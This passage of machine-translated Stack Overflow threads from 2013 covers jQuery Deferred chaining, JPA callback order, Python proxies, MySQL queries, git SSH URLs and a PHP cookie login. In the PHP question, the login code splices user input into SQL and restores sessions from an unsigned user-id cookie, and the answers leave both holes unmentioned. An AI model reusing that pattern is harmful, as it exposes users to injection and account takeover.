*   [MongoDB::教程](https://metacpan.org/module/MongoDB::Tutorial)
*   [MongoDB::示例](https://metacpan.org/module/MongoDB::Examples)

迭代结果与 DBI 方式非常相似：

```
use Data::Printer;
use MongoDB;

# no query is performed on initialization!
my $cursor = $collection
    ->find({ active => 1, country => 'Canada' }) # filter "active" records from Canada
    ->sort({ stamp => -1 }) # order by "stamp" attribute, desc.
    ->limit(1000);          # first 1000 records

# query & iterate
while (my $row = $cur->next) {
    # it is 'p', from Data::Printer!
    p $row;
} 
```

# javascript - 如何暂停在链中间延迟的 jQuery 的解析？

> ID：14348846
> 
> 赞同：0
> 
> 时间：2013-01-15T23:28:33.840
> 
> 标签：javascript, jquery, jquery-deferred, promise

我正在尝试将序列化逻辑强制到网页上的一组异步活动上。我相当确定我想使用 jQuery 延迟对象，但我遇到了一个问题，即我想要执行的函数取决于用户何时决定通过单击各种按钮进行选择。我正在使用以下 jsFiddle 想法寻求帮助：

考虑一系列 4 个按钮。单击时，每个按钮都会禁用自身并启用下一个按钮。每个按钮在启用之前不应设置其事件。只有在启用第三个按钮后，才能完成一个附加任务（在这种情况下是一个警报）。

# 基本 HTML 代码

```
<button id="btn1">Click 1st</button>
<button id="btn2" disabled="disabled">Click 2nd</button>
<button id="btn3" disabled="disabled">Click 3rd</button>
<button id="btn4" disabled="disabled">Click 4th</button> 
```

# 每个步骤中的任务

```
var fnDoStageOne = function() {
  $("#btn1").one("click", function(event, ui) {
    $("#btn1").prop("disabled", true);
    $("#btn2").prop("disabled", false);
    //STAGE ONE IS ONLY DONE AFTER THIS POINT
  });
};

var fnDoStageTwo = function() {
  $("#btn2").one("click", function(event, ui) {
    $("#btn2").prop("disabled", true);
    $("#btn3").prop("disabled", false);
    //STAGE TWO IS ONLY DONE AFTER THIS POINT
  });
};

var fnDoStageThree = function() {
  $("#btn3").one("click", function(event, ui) {
    $("#btn3").prop("disabled", true);
    $("#btn4").prop("disabled", false);
    //STAGE THREE IS ONLY DONE AFTER THIS POINT
  });
  alert("Shouldn't see this if button 3 isn't active yet");
};

var fnDoStageFour = function() {
  $("#btn4").one("click", function(event, ui) {
    $("#btn4").prop("disabled", true);
    alert("Task complete");
    //STAGE FOUR IS ONLY DONE AFTER THIS POINT
  });
}; 
```

# 不正确的控制逻辑

```
var oDeferredObj = $.Deferred();

oDeferredObj.then(fnDoStageOne);
oDeferredObj.then(fnDoStageTwo);
oDeferredObj.then(fnDoStageThree);
oDeferredObj.then(fnDoStageFour);
oDeferredObj.resolve(); 
```

jsfiddle可以在这里看到：http: [//jsfiddle.net/sva79/](http://jsfiddle.net/sva79/)

我最初的理解是，我可以使用 .then() 函数将函数链接到 deferred 中。显然，这不起作用，因为第 3 步中的附加任务会在页面加载时触发。我需要如何调整此场景的控制或逻辑以解决每个步骤，直到注册了相应的按钮按下？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T01:09:29.727

您的代码示例没有按照您的想法执行。您所做的只是添加到解决后直接要做的事情列表中`oDeferredObj`。此外，还存在解决任务何时真正“完成”的问题，您的代码并没有完全标记。

这似乎是我前段时间在另一个问题中解决过的问题，但我不确定我是否想要我当时给出的答案，所以让我重新尝试。

您正在寻找的是一种将*新*的承诺链接在一起的方法。我想，您还想要一种方式来说明何时解决（或拒绝）承诺。

将数据从一个 Promise 异步获取到另一个 Promise 的一种好方法是用 链接它们`pipe`，但是由于您想从 UI 事件中触发任务的完成，我很难想象比我下面的内容更好的东西。

我不会发誓这是最好的方法，我能想到的最简单的处理方法是创建一个实用函数，它接受给定的承诺和“任务”，创建一个新的承诺，让你的任务决定如何处理承诺，*但只有在给定的承诺解决后*，并返回新的承诺。

```
var nextStage = function (promise, task) {
  var oDeferredObj = $.Deferred();
  promise.then(function () {
    task(oDeferredObj);
  });
  return oDeferredObj;
} 
```

这可以用于将您的任务菊花链在一起：

```
/* Creation of deferred and initial wiring */
var p1;
var starterObj = $.Deferred();
p1 = starterObj;
p1 = nextStage(p1, fnDoStageOne);
p1 = nextStage(p1, fnDoStageTwo);
p1 = nextStage(p1, fnDoStageThree);
p1 = nextStage(p1, fnDoStageFour);
p1.done(function () {
  alert("All stages done.");
})
$("#start").one("click", function (event, ui) {
  //fire it up.
  $("#start").prop("disabled", true);
}); 
```

显然，你会想要做一些事情来表明某个特定的任务已经完成，例如：

```
var fnDoStageOne = function (promise) {
  //setup, etc.
  $("#btn1").one("click", function (event, ui) {
    //.. whatever needs to happen  in the ui.
    //STAGE ONE IS ONLY DONE AFTER THIS POINT
    promise.resolve();
  });
}; 
```

请注意，我只是在承诺*成功*时给了你一个开始。*明智的做法是在他们失败*时多做一点。此外，如果您想将数据从一个 Promise 传递到另一个 Promise，您可能希望需要`pipe`，等等。

jsFiddle 中的完整源代码（根据您的修改）[here](http://jsfiddle.net/jfcox/pcpXN/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:55:25.710

我不明白你为什么需要延迟，但我知道你没有使用它们。

尝试这样的事情。

```
firstResolution  = $.Deferred();
secondResolution = $.Deferred();

function stepOne() {
   //disable button one
   //enable button two
   return firstResolution;
}

function stepTwo() {
    //disable button two
    //enable button three
}

$.when(stepOne()).then(stepTwo);

$.when(secondResolution).then(stepThree);

// This is also acceptable (and maybe better?)
// $.when(firstResolution, seconResolution).then(stepThree);

// when you resolve, then step two will fire.
firstResolution.resolve();

// and for stepThree to fire
secondResolution.resolve(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T01:33:49.140

也许您想使用队列，它是为可能耗时的事件序列而设计的。他们是同一个系统，权力`$.animate`; 一次只执行一个函数，直到第一个明确表示它以`$.dequeue`.

另一方面，延迟实际上是在数据可用时使用数据。

请参阅[queue](http://api.jquery.com/jQuery.queue/)和[dequeue](http://api.jquery.com/jQuery.dequeue/)。另请参阅我写的[另一个最近的答案](https://stackoverflow.com/a/14347008/17875)，其中包含示例代码和 jsfiddle。

# java - 如果实体监听方法和实体本身的生命周期回调重复了怎么办？

> ID：14348849
> 
> 赞同：0
> 
> 时间：2013-01-15T23:28:46.367
> 
> 标签：java, jakarta-ee, jpa

只是好奇。

从 WebSphere 中看到规则：重复的生命周期回调方法 如果为一个实体生命周期事件定义了多个回调方法，则这些方法的调用顺序如下： 实体监听器中定义的生命周期回调方法：生命周期回调在实体类的实体侦听器类上定义的方法的调用顺序与 EntityListeners 注释或 XML 描述符中实体侦听器类的规范相同。监听器超类：实体监听器超类中定义的回调方法在子级之前被调用。实体生命周期方法：WebSphere® eXtreme Scale 不支持实体继承，因此实体生命周期方法只能在实体类中定义。

但它只提到了多个回调来自不同侦听器的场景。

如果在实体类中定义了一个回调（比如@PostLoad），但在侦听器中定义了另一个（也是@PostLoad）怎么办？

首先调用哪个回调方法？顺序是指定的还是依赖于提供者的？

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T21:01:09.663

首先调用监听器中的方法，然后调用实体中的回调方法。更具体地说，顺序是：

1.  默认侦听器（在 XML 描述符中定义的侦听器）
2.  侦听器中的方法，从超类开始，按照在 @EntityListeners 注释中定义的顺序。
3.  实体层次结构中的回调方法，从最上面的超类开始。

调用顺序在 JPA 2.0 规范*3.5 Entity Listeners and Callback Methods*中有详细说明（并带有说明性示例） 。

# javascript - Javascript对象数组访问属性未定义？

> ID：14348851
> 
> 赞同：0
> 
> 时间：2013-01-15T23:28:55.640
> 
> 标签：javascript, arrays, json

这是我从 firebug 获得的一些输出

```
<div id='div_undefined'>[{"Region":"AD","Date":"","ArticleID":"abc-345"},    {"Region":"CD","Date":"","ArticleID":"abc-345"}]</div> 
```

您可以在其中看到 JS 对象数组并注意 div_undefined。如果您查看下面的功能，我知道我的对象已定义，因为它正在打印出来。为什么当我尝试访问 ArticleID 时 Items[0] 会返回 undefined

这是我的函数中的代码

```
function myFunc(Items){
    var item = Items[0];
    Write("<div id='div_" + item.ArticleID + "'>" + Items + "</div>");
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T23:32:52.237

如果连接`Items`产生此输出，那么它是一个**字符串**（包含 JSON），您必须先将其解析为 JS 数据结构（在本例中为数组）：

```
function myFunc(Items){
    Items = JSON.parse(Items);
    var item = Items[0];
    Write("<div id='div_" + item.ArticleID + "'>" + Items + "</div>");
    // Will output
    // <div id='div_abc-345'>[object Object], [object Object]</div>
} 
```

理想情况下，您会在将值传递给函数*之前执行此操作。*我不知道你在追求哪个输出，所以我只能提供建议。

* * *

否则，`Items[0]`指的是字符串的第一个字母（也是一个字符串）并且字符串没有`ArticleID`属性，因此你得到`undefined`.

* * *

您可能会发现这个问题也很有帮助：[访问/处理（嵌套）对象、数组或 JSON](https://stackoverflow.com/questions/11922383/i-have-a-nested-data-structure-json-how-can-i-access-a-specific-value)正如马特（以及在另一个问题中）所提到的，如果您想*调试*代码，请使用`console.log`.

# ios6 - IOS 6 MPMoviePlayerController 旋转问题

> ID：14348855
> 
> 赞同：0
> 
> 时间：2013-01-15T23:29:13.357
> 
> 标签：ios6, cocos2d-iphone, orientation

我刚刚更新到 IOS 6，现在当我运行我的应用程序时，MPMoviePlayerControler 会错误地显示视频。该应用程序是横向的，但是当视频以纵向显示时。我创建了新的 .h 和 .m 文件，它们是 MPMoviePlayerController 的子文件。这是我的两个文件

。H

```
#import <Foundation/Foundation.h>
#import "cocos2d.h"
#import <MediaPlayer/MediaPlayer.h>

@interface TrashPackPlayer : MPMoviePlayerController

@end 
```

.m

```
#import "TrashPackPlayer.h"

@implementation TrashPackPlayer

-(id)init{
    [super init];
    return self;
}

- (BOOL)shouldAutorotate
{
    return YES;
}

- (NSInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskLandscape;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
{
    return UIInterfaceOrientationIsLandscape(toInterfaceOrientation);
}

@end 
```

我这样创建媒体播放器：

```
player = [[TrashPackPlayer alloc] initWithContentURL:videoURL];
    player.view.frame = CGRectMake(0, 0, sharedInfo.screenSize.width, sharedInfo.screenSize.height);
    player.controlStyle = MPMovieControlStyleFullscreen;
    player.scalingMode = MPMovieScalingModeAspectFit;
    [player play];

    [[[CCDirector sharedDirector] openGLView] addSubview:player.view]; 
```

这个对吗？

我需要做什么才能正确显示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T07:59:32.083

iOS6 中的旋转发生了巨大变化，请查看第四点： [http ://megawertz.com/blog/2012/9/20/ios-6-and-rotation](http://megawertz.com/blog/2012/9/20/ios-6-and-rotation)

最顶层的视图控制器负责设置允许的方向，子类化视图控制器并不能解决您的问题。

# css - 检测元素是否正在转换

> ID：14348856
> 
> 赞同：1
> 
> 时间：2013-01-15T23:29:16.210
> 
> 标签：css, css-transitions

如果现在正在对元素应用任何类型的转换，如何通过 js 检测？

### 我的问题的简短故事：

我有一种情况，我在`transitionend`事件上触发了一个函数，但有时该元素没有应用任何转换（例如，因为在 Firefox 中，用户快速单击了某个元素，这使得转换变得疯狂和停止工作）所以我想知道它什么时候不起作用，然后自己触发该功能，跳过`transitionend`. 我试图避免丑陋的解决方案..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:57:34.537

由[W3C 编辑草案指定 - CSS 过渡](http://dev.w3.org/csswg/css3-transitions/#transition-events)

> 'transitionend' 事件在转换完成时发生。如果在完成之前移除了转换，例如移除了转换属性，则不会触发该事件。

所以，我认为没有有效的*简单方法*来解决这个问题。解决方案留给实现（浏览器）来决定它是否渲染过渡。

也许，一个解决方案可能是将侦听器附加到触发转换的元素，并在特定的经过时间后检查*转换*的元素是否设置了所需的 CSS 属性，如果这些属性未按预期设置，您可以运行您的自己发挥作用。

# python - 请求库未通过代理正确引导 HTTP 请求

> ID：14348857
> 
> 赞同：1
> 
> 时间：2013-01-15T23:29:25.703
> 
> 标签：python, node.js, proxy, python-requests

我知道如何`requests`很好地使用，但由于某种原因，我没有成功让代理工作。我提出以下要求：

```
r = requests.get('http://whatismyip.com', proxies={'http': 'http://148.236.5.92:8080'}) 
```

我得到以下信息：

```
requests.exceptions.ConnectionError: [Errno 10060] A connection attempt failed b
ecause the connected party did not properly respond after a period of time, or e
stablished connection failed because connected host has failed to respond 
```

然而，我知道代理可以工作，因为使用节点：

```
request.get({uri: 'http://www.whatismyip.com', proxy: 'http://148.236.5.92:8080'},
    function (err, response, body) {var $ = cheerio.load(body); console.log($('#greenip').text());}); 
```

我得到以下（正确）响应：

```
148.236.5.92 
```

此外，当我以不同的方式尝试`requests`请求时（例如，没有`http://`在代理前面写入），它只会允许请求正常通过，而无需通过代理或返回错误。

我在 Python 中做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:12:45.377

这是一个已知问题：[https ://github.com/kennethreitz/requests/issues/1074](https://github.com/kennethreitz/requests/issues/1074)

我不确定为什么要花这么长时间才能修复。不过，要回答您的问题，您没有做错任何事。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T06:43:28.113

正如 sigmavirus24 所说，这是一个[已知问题](https://github.com/kennethreitz/requests/issues/1074)，已修复，但尚未打包成新版本并推送到 PyPI。

所以，如果你急需这个，你可以从 git repo 的 master 升级。

如果您正在使用`pip`，这很简单。而不是这个：

```
pip install -U requests 
```

做这个：

```
pip install -U git+https://github.com/kennethreitz/requests 
```

如果您不使用`pip`，则可能必须显式地从本地副本中显式地`git clone`存储 repo，然后`easy_install .`或或其他任何内容。`python setup.py`

# mysql - 如果值为否，则选择其他

> ID：14348867
> 
> 赞同：2
> 
> 时间：2013-01-15T23:30:07.477
> 
> 标签：mysql, sql, pdo

我有一个名为`is_thumbnail`默认值的列`no`。我根据以下选择一行`is_thumbnail = 'yes'`

```
 $query = $conn->prepare("SELECT * FROM project_data 
                            WHERE project_id = :projectId 
                            AND is_thumbnail = 'yes' 
                            LIMIT 1"); 
```

有可能没有行的值为`yes`。在这种情况下，我想选择具有相同`projectId`值的第一行，而不管`is_thumbnail`

现在我知道我可以看到查询返回的内容，然后运行另一个查询。我想知道是否可以在单个查询中执行此操作，或者是否可以通过某种方式利用 PDO？我刚开始使用 PDO。谢谢！

示例数据：

```
id  project_id image                              is_thumbnail 
20  2          50f5c7b5b8566_20120803_185833.jpg  no
19  2          50f5c7b2767d1_4link 048.jpg        no
18  2          50f5c7af2fb22_4link 047.jpg        no 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:37:11.010

```
$query = $conn->prepare("SELECT * FROM project_data 
                            WHERE project_id = :projectId 
                            ORDER BY is_thumbnail ASC LIMIT 1"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T00:04:29.587

鉴于问题中描述的模式显示给定的多行，如果有例如具有许多相关行的单个项目，则`project_id`仅使用解决方案可能不会产生良好的性能。`ORDER BY is_thumbnail ...`对行进行排序的成本可能相当高，并且无法使用索引。可能需要的替代解决方案是：

```
SELECT * FROM (
  SELECT *
  FROM project_data 
  WHERE project_id = :projectId AND is_thumbnail = "yes"
  ORDER BY id DESC
  LIMIT 1

  UNION

  SELECT *
  FROM project_data 
  WHERE project_id = :projectId AND is_thumbnail = "no"
  ORDER BY id DESC
  LIMIT 1
) AS t 
ORDER BY t.is_thumbnail = "yes" DESC
LIMIT 1 
```

虽然这个解决方案理解起来有点复杂，但它能够使用复合索引`(project_id, is_thumbnail, id)`来快速找到与请求条件完全匹配的行。如果两者都找到，则外部选择可确保是/否行的稳定排序。

Note that you could also just issue two queries, and probably get similar or better performance. In order to use the above `UNION` and sub-select, MySQL will require temporary tables, which aren't great in busy environments.

# python - 如何在python中以特定格式显示当前时间？

> ID：14348868
> 
> 赞同：-2
> 
> 时间：2013-01-15T23:30:12.290
> 
> 标签：python, datetime

我只是想以类似 Jan13 的格式显示当前月份和年份，这意味着 2013 年 1 月。顺便说一下，应该是当地时间。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:31:39.423

这很简单。请参阅[日期时间](http://docs.python.org/2/library/datetime.html)文档。

```
>>> from datetime import datetime
>>> datetime.now().strftime("%b%y")
'Jan13' 
```

# facebook - Facebook like 按钮未在 Firefox 的 iframe 中创建

> ID：14348869
> 
> 赞同：1
> 
> 时间：2013-01-15T23:30:17.273
> 
> 标签：facebook, facebook-like, facebook-likebox

我在网站上有一个类似 Facebook 的按钮，它链接到他们的 Facebook 页面。

[http://www.facebook.com/plugins/like.php?api_key=158676140902498&locale=en_US&sdk=joey&channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D18%23cb% 3Df3c3ba27b53005a%26origin%3Dhttp%253A%252F%252F07bce2b0664e8df0ed388a0c7647cf80.sites.gozesty.com%252Ff4c48dfa4eebd4%26domain%3D07bce2b0664e8df0ed388a0c7647cf80.sites.gozesty.com%26relation%3Dparent.parent&href=http%3A%2F%2Fwww.facebook.com%2FMissionBrewery&node_type=链接&width=450&layout=box_count&colorscheme=light&show_faces=false&send=false&extended_social_context=false](http://www.facebook.com/plugins/like.php?api_key=158676140902498&locale=en_US&sdk=joey&channel_url=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D18%23cb%3Df3c3ba27b53005a%26origin%3Dhttp%253A%252F%252F07bce2b0664e8df0ed388a0c7647cf80.sites.gozesty.com%252Ff4c48dfa4eebd4%26domain%3D07bce2b0664e8df0ed388a0c7647cf80.sites.gozesty.com%26relation%3Dparent.parent&href=http%3A%2F%2Fwww.facebook.com%2FMissionBrewery&node_type=link&width=450&layout=box_count&colorscheme=light&show_faces=false&send=false&extended_social_context=false)

如果您将其复制并粘贴到 Chrome 中，它会完美运行。在 Firefox 和 Safari 中，没有项目出现。

我尝试在 Firefox 中制作类似按钮，并意识到当链接是 Facebook 链接时，该项目不会显示。任何人都知道为什么会这样以及可能的解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:36:52.493

在我的 safari (6.0.2) 上运行良好

# jquery - 使用浏览器调整大小的三个部分

> ID：14348871
> 
> 赞同：1
> 
> 时间：2013-01-15T23:30:31.330
> 
> 标签：jquery, browser, resize

*编辑：在阅读我最初在下面写的内容之前，我想更清楚地说明这一点......我正在创建一个网站，使用三个部分相互浮动。我使用链接从一个部分滚动到另一个部分。滚动到该部分时，我希望该部分的背景适合浏览器屏幕大小。如果在仍然查看页面的该部分时浏览器被调整大小，我希望背景“捕捉”到窗口并继续填充屏幕。目前，这只发生在最左边的部分。*

我不确定这是否可能，但我想我会看到的。我一直在研究本网站教程中的单页策略：http: [//jqueryheaven.com/2012/08/building-a-one-page-portfolio-with-jquery-slide/](http://jqueryheaven.com/2012/08/building-a-one-page-portfolio-with-jquery-slide/)

虽然本教程使用了许多不同的部分，但我只让我的网站使用 3 或 4 个。无论哪种方式，我都试图弄清楚如何让每个部分适应浏览器窗口，无论您调整窗口大小有多大或多小. 到目前为止，在教程和我制作的网站上，只有最左边的部分适合窗口。其余部分不会调整大小以适应。

这是我到目前为止的代码：

HTML（我省略了容器内的内容：

```
<div id="main">

<section id="artwork" class="box">
</section>

<section id="home" class="box">
</section>

<section id="contact" class="box">
</section>

</div> 
```

CSS（尝试对部分使用 100% 的宽度和高度，以及 background-size:cover，但没有任何效果）：

```
.box {
float:left;
}

#artwork {
background: #b4c620;
width:100%;
height:100%;
background-size:cover;
}

#home {
background: #58267a;
with:100%;
height:100%;
background-size:cover;
}

#contact{
background: #b4c620;
width:100%;
height:100%;
background-size:cover;
} 
```

脚本（也取自教程，正如我所提到的，它只调整第一个部分框的大小，（#artwork，）而不是其余部分。虽然，如果您在调整浏览器大小后链接到该部分，该部分会适合。）：

```
<script type="text/javascript">
function resizeBoxes() {

var browserWidth = $(window).width();
var browserHeight = $(window).height();

$('#main').css({
width: browserWidth*3,
});

$('.box').css({
width: browserWidth,
height: browserHeight,
});

}

resizeBoxes();

$(window).resize(function() {
resizeBoxes();
});

$('nav ul li a').click(function(){
return false;
});
</script>

<script type="text/javascript">
function goTo(horizontal,vertical) {

var browserWidth = $(window).width();
var browserHeight = $(window).height();

$('#main').animate({
    marginLeft: '-'+browserWidth*horizontal,
    marginTop: '-'+browserHeight*vertical,
}, 1000);

}
</script> 
```

我希望你明白我想要完成什么。我是新手，所以如果我的编码一团糟，我很抱歉。如果您能帮助我找到解决方案，我将不胜感激！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-31T18:58:28.593

我相信我明白你在问什么。[我刚刚在我的网站michaelagarrison.com](http://www.michaelagarrison.com/)上完成了此操作（您可以在[http://www.michaelagarrison.com/assets/js/main.js](http://www.michaelagarrison.com/assets/js/main.js)查看我的 JS 文件）。在我的网站上，它会更改每个`section`标签的高度以固定浏览器窗口的高度。您所要做的就是使用我的 jQuery 脚本的这个修改版本：

```
$(document).ready(function(){
  function resizeSection(tag) {
    var docHeight = $(window).height();  // Get the height of the browser window
    var docWidth = $(window).width();    // Get the width of the browser window
    // Now set the height / width to the browser height / width in css
    $(tag).css({'height': docHeight + 'px', 'width': docWidth + 'px', 'display': 'block'});
  }
  // Replace TagNameHERE with the correct tag you want resized
  $('TagNameHERE').each(function(){  
    resizeSection(this);  // Call the function and make sure to pass 'this'
  });
  // This will handle the resize
  $(window).resize(function() {
    $('TagNameHERE').each(function(){
      resizeSection(this);
    });
  });
}); 
```

奇怪的是 100% 的宽度/高度不起作用。在我的原始脚本中，我只是使用填充来获得正确的高度。请注意，您需要以下代码才能使我的脚本正常工作：

```
// Put this line in the head.  You can also use a local jQuery file if you wish
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script> 
```

如果我理解正确，请告诉我。

# git - Git 存储库 URL - 没有绝对路径的 SSH 语法

> ID：14348874
> 
> 赞同：65
> 
> 时间：2013-01-15T23:30:43.877
> 
> 标签：git, ssh

我正在一个自定义端口（比如说 12345）上运行一个可通过 SSH 访问的 git 存储库服务器。我发现在这种情况下，需要使用 SSH 语法指定存储库 URL：

```
git clone ssh://login@server.com:12345/absolute/path/to/repository 
```

我想以这样一种方式设置它，即用户可以在不指定**绝对**路径的情况下克隆存储库。

```
git clone ssh://login@server.com:12345/repository.git 
```

我研究了该主题并发现了以下选项：

1.  从 URL 中删除自定义端口并让用户将其添加到他们的`~/.ssh/config`文件中（最后的解决方法，而不是解决方案）。
2.  删除 SSH 并使用`git-daemon`并指定其`--base-path`参数（仍然是一种解决方法......）
3.  使用类似`gitosis`or的实用程序`gitolite`- 但仅将其用于此目的不是矫枉过正吗？Gitosis 已停产，gitolite 是一个相当庞大的软件......

我想要的只是一个带有自定义端口的“更漂亮”的 SSH URL（这样我就可以分发整个`git clone`命令，而无需远程用户提供任何其他内容）。在我的情况下，上述哪种解决方案最可行？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2013-01-16T00:04:22.957

如果您使用`ssh`URL 的替代形式，则不需要绝对路径。例如...

```
git clone lars@myserver.example.com:repos/myrepo.git 
```

...将克隆`repos/myrepo.git`相对于我的主目录的存储库，尽管这不允许使用备用端口。但是，您也可以使用`~`任何一种形式来指示用户的主目录，例如：

```
git clone ssh://login@server.com:12345/~/repository.git 
```

顺便说一句，尽管已停产，但`gitosis`功能相当不错，而且代码既小又易于理解。它提供了一组有用的访问控制和存储库的自助管理。我不会完全打折。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-10-03T21:59:04.610

我这样做，不完全是你问的，但关闭和更漂亮的链接：

创建一条路径

```
/srv/git 
```

放置 git 项目的位置

接下来创建一个指向主页的符号链接：

```
ln -s /srv/git $HOME 
```

接下来你可以有更短的链接

```
git clone user@server:git/myproject.git 
```

如果您有一个项目，您可以摆脱 git/ 网址中的部分

```
ln -s /srv/git/myproject.git $HOME 
```

下一个

```
git clone user@server:myproject.git 
```

将工作。当然，URL 末尾的 .git 仅来自创建名称中带有 .git 的裸文件。另请注意，不需要 ssh:// 部分：@ 表示它是 git 的 ssh URL。

更新：让我添加一个旁注：遵循我现在用作存储库位置的最新[文件系统层次结构标准。](https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard)`/srv/git`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-02-05T19:31:52.297

我不确定这是否真的值得成为一个完整的答案，但我厌倦了与特定于评论的格式规则作斗争。我来说：

我只想补充一点，这似乎是一个特定于版本的更改，尽管我不确定它是客户端还是服务器/存储库持有者端：我有一个`.git/config`包含很多 URL 的文件，例如：

```
[remote "bob"]
    url = ssh://ME@MACHINE<strong>/~ME</strong>/repositories/REPO.git
    fetch = +refs/heads/*:refs/remotes/bob/* 
```

当我在 2010 年设置它们时，它们都可以正常工作，并且在我最后一次使用这些遥控器时仍在工作，大约是 2016 年左右。

现在，在 2.18.0 版本上，这些都不起作用，我需要使用`:/~ME/foo`or`:/~/foo`表示法。也就是说，你试图做的事情并不总是错的。

# java - 获取地图 来自 IBatis

> ID：14348887
> 
> 赞同：1
> 
> 时间：2013-01-15T23:31:49.030
> 
> 标签：java, ibatis

我正在创建一个 ibatis 查询，它的结果应该是：

```
Map<String,CustomData> 
```

我的 ibatis 查询：

```
<resultMap id="dataMap" class="java.util.HashMap">
    <result property="key" column="UUID"/>
    <result property="value" resultMap ="customData"/>
</resultMap>

<resultMap id="customData" class="com.model.CustomData">
    <result property="x" column="X_COL"/>

</resultMap>

<select id="fetchData"
        resultClass="java.util.HashMap"
        parameterClass="java.util.Map">
   SELECT
    UUID AS UUID,
    (CASE
    WHEN SOME_DATA IS NOT NULL THEN  'TRUE'         
    END) AS X_COL
    FROM TABLE
 </select> 
```

CustomData 是一个 java 类：

```
public class CustomData{
 private String x;

//Getters & Setters

} 
```

我希望在 Java 上获得以下信息：

```
Map<String,CustomData> 
```

但是我得到以下信息：

```
Map<String,String> 
```

有任何想法吗 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T00:19:52.183

您应该尝试将标签`resultClass`中的属性替换为a值，如下所示：`select``resultMap``"dataMap"`

```
<select id="fetchData"
    resultMap="dataMap"
    parameterClass="java.util.Map">
<!-- your query -->
</select> 
```

在您的情况下，该`queryForList`方法尝试实例化 a`java.util.HashMap`而不是这个，它应该使用`dataMap`您在上面定义的映射。

# php - 创建 Cookie

> ID：14348888
> 
> 赞同：0
> 
> 时间：2013-01-15T23:31:49.440
> 
> 标签：php

我正在尝试使用 cookie 来保持我网站上的登录持久性。但是，由于某种我不知道的原因，cookie 没有被创建。仅创建会话。我正在使用 Sessions 来跟踪登录的用户，并使用 cookie 在他们回来时重新创建会话。我究竟做错了什么？

创建会话和 cookie：

```
<?php

$connect= // connect variables

    $query= "SELECT * FROM users where email= '$email' AND password=    
'$password'";
    $result= mysqli_query($connect, $query)
        or die('error with query');
        if (mysqli_num_rows($result) == 1) {
            $row= mysqli_fetch_array($result);
            session_start();
            $_SESSION['id']= $row['user_id'];
            $_SESSION['name']= $row['fname'] . " " . $row['lname'];
            setcookie('id', $row['user_id']);
            $profile_url= 'http://'. $_SERVER['HTTP_HOST'] . 
dirname($_SERVER['PHP_SELF']) . '/profile.php';
            header('Location:profile.php');     
            }
        else {
            $message= "Incorrect email/password combination.";
            }

?> 
```

检查 cookie 以恢复会话：

```
<?php

session_start()
/* if a session does not exist, see if a cookie does to set the session */
if (!isset($_SESSION['id'])) {
    if (isset($_COOKIE['id'])) {
        $_SESSION['id'] = $_COOKIE['id'];
    }
    else {

    }
}

?> 
```

**编辑**

我需要在 cookie 中添加一个过期参数！

```
setcookie('id', $row['user_id'],time()+86400);
Note: The above example sets the cookie for 1 day 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T23:33:22.233

Cookie 已创建，但您创建它的时间为 0 秒。第三个参数是$expire，使用它...

[http://php.net/manual/en/function.setcookie.php](http://php.net/manual/en/function.setcookie.php)

$过期报价

> cookie 过期的时间。这是一个 Unix 时间戳，因此是自纪元以来的秒数。换句话说，您很可能会使用 time() 函数加上您希望它过期之前的秒数来设置它。或者你可以使用 mktime()。time()+60*60*24*30 将设置 cookie 在 30 天内过期。**如果设置为 0 或省略，cookie 将在会话结束时（浏览器关闭时）过期。**

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T23:33:35.687

您在这里遗漏了一些东西（到期，路径，域）：

```
setcookie('id', $row['user_id'],time()+86400,"/",".your_domain.com"); 
```

注意：上面的示例在域的根目录中为域“your_domain.com”设置了 1 天的 cookie。现在有很多域！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T23:36:31.740

我需要在 cookie 中添加过期日期。

```
setcookie('id', $row['user_id'],time()+86400); 
```

# ruby-on-rails - Rails 3 命名空间和自定义类的问题（未初始化的常量）

> ID：14348891
> 
> 赞同：2
> 
> 时间：2013-01-15T23:32:02.700
> 
> 标签：ruby-on-rails, ruby-on-rails-3, module, namespaces

我的 Rails 3.2.11 项目中有一个名为的文件，`app/queries/visible_discussions.rb`如下所示：

```
class VisibleDiscussions
  ...
end 
```

我想命名查询，以便我可以使用类似的方式调用它，`Queries::VisibleDiscussions`所以我尝试执行以下操作：

```
module Queries
  class VisibleDiscussions
    ...
  end
end 
```

但是，`uninitialized constant Queries (NameError)`当我尝试`Queries::VisibleDiscussions`从 rails 控制台调用时，我得到了一个。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T03:15:37.153

如果你添加`lib`到你的 autoload_paths 那么它将尊重 lib 下的命名空间 -`lib/query/visible_discussions.rb`

或在 app 下创建一个新目录 - 说 src 然后将你的代码嵌套在那里 -`app/src/query/visible_discussions.rb`

我会在你的帖子中使用第三种风格，即

```
module Query
  class VisibleDiscussions
